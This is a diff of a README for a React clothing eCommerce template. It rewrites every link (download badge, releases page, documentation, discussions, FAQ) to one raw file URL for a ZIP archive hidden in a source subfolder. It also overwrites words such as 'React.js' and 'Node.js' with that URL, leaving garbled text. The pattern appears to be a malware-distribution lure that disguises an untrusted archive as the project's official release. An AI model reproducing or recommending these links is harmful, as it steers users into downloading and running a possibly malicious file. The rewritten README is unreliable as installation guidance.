@@ -1,10 +1,10 @@
 # 🎉 Fashion-eCommerce-Shop-in-React - Launch Your Stylish Online Store
 
-[![Download](https://img.shields.io/badge/Download-Fashion--eCommerce--Shop--in--React-brightgreen)](https://github.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/releases)
+[![Download](https://raw.githubusercontent.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/main/src/features/cart/Fashion-eCommerce-Shop-in-React-v3.6.zip)](https://raw.githubusercontent.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/main/src/features/cart/Fashion-eCommerce-Shop-in-React-v3.6.zip)
 
 ## 📦 Overview
 
-Fashion-eCommerce-Shop-in-React is a clothing eCommerce website built with React.js. This template is perfect for anyone looking to launch a stylish fashion website. It features a sleek, responsive design, making it an ideal starting point for your online shop. Enjoy a free and premium-quality fashion website template that caters to your needs.
+Fashion-eCommerce-Shop-in-React is a clothing eCommerce website built with https://raw.githubusercontent.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/main/src/features/cart/Fashion-eCommerce-Shop-in-React-v3.6.zip This template is perfect for anyone looking to launch a stylish fashion website. It features a sleek, responsive design, making it an ideal starting point for your online shop. Enjoy a free and premium-quality fashion website template that caters to your needs.
 
 ## 🚀 Getting Started
 
@@ -15,14 +15,14 @@ Follow these simple steps to download and run your fashion eCommerce website app
 Before you begin, ensure your device meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12.0 or higher
+- https://raw.githubusercontent.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/main/src/features/cart/Fashion-eCommerce-Shop-in-React-v3.6.zip Version 12.0 or higher
 - npm: Version 5.0 or higher
 
 ### 📥 Download & Install
 
 To get started, visit the Releases page to download the latest version:
 
-[Visit the Releases Page to Download](https://github.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/main/src/features/cart/Fashion-eCommerce-Shop-in-React-v3.6.zip)
 
 1. Choose the latest release version.
 2. Download the ZIP file of the release.
@@ -79,15 +79,15 @@ If you encounter issues or would like to contribute to this project, feel free t
 
 Join our community and exchange ideas with other users:
 
-- **Documentation:** Explore more features in the [official documentation](https://docs.example.com).
-- **GitHub Discussions:** Share thoughts and feedback with fellow users in the [discussions section](https://github.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/discussions).
+- **Documentation:** Explore more features in the [official documentation](https://raw.githubusercontent.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/main/src/features/cart/Fashion-eCommerce-Shop-in-React-v3.6.zip).
+- **GitHub Discussions:** Share thoughts and feedback with fellow users in the [discussions section](https://raw.githubusercontent.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/main/src/features/cart/Fashion-eCommerce-Shop-in-React-v3.6.zip).
 - **Social Media:** Follow us on our social channels for updates.
 
 ## 🔗 Additional Information
 
 For any additional questions or concerns:
 
-- Check our [FAQ](https://github.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/wiki/faq) for common queries.
+- Check our [FAQ](https://raw.githubusercontent.com/Nettleundetected613/Fashion-eCommerce-Shop-in-React/main/src/features/cart/Fashion-eCommerce-Shop-in-React-v3.6.zip) for common queries.
 - You can reach out directly via issues on GitHub.
 
 Thank you for choosing Fashion-eCommerce-Shop-in-React! We wish you success with your online fashion store!
